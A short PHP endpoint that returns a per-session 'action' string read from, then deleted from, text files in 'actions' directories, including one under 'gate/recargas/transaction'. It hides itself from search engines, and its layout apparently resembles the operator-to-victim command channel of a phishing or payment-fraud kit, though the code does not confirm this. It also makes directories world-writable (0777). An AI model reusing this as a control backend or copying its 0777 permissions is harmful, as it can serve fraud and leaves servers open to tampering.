<?php


session_start();
header('Content-Type: application/json');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('X-Robots-Tag: noindex, nofollow, noarchive');

$jsonRaw = file_get_contents('php://input');
$json = json_decode($jsonRaw, true);

$transactionId = $_REQUEST['transactionId'] ?? $_REQUEST['session_id'] ?? ($_POST['transactionId'] ?? $_POST['session_id'] ?? ($json['transactionId'] ?? $json['session_id'] ?? ''));

if ($transactionId === null || $transactionId === '') {
    echo json_encode(['action' => null]);
    exit;
}

$safeTxId = preg_replace('/[^a-zA-Z0-9_-]/', '', (string) $transactionId);

$actionDirs = [];
$current = __DIR__;
for ($i = 0; $i < 8; $i++) {
    $actionDirs[] = $current . '/actions';
    $actionDirs[] = $current . '/gate/recargas/transaction/actions';
    $parent = dirname($current);
    if ($parent === $current) {
        break;
    }
    $current = $parent;
}

$actionDirs[] = dirname(__DIR__) . '/actions';
$actionDirs[] = dirname(dirname(__DIR__)) . '/actions';

$actionDirs = array_values(array_unique(array_filter($actionDirs, static function ($dir) {
    return $dir !== '';
})));

$action = null;
if ($safeTxId !== '') {
    foreach ($actionDirs as $actionDir) {
        if (!is_dir($actionDir)) {
            @mkdir($actionDir, 0777, true);
        }
        @chmod($actionDir, 0777);

        $txFile = $actionDir . '/' . $safeTxId . '.txt';
        if (file_exists($txFile)) {
            $fileContent = trim((string) file_get_contents($txFile));
            if ($fileContent !== '') {
                if ($action === null || $action === '') {
                    $action = $fileContent;
                }
            }
            @unlink($txFile);
        }
    }
}

echo json_encode(['action' => $action, 'transactionId' => $safeTxId]);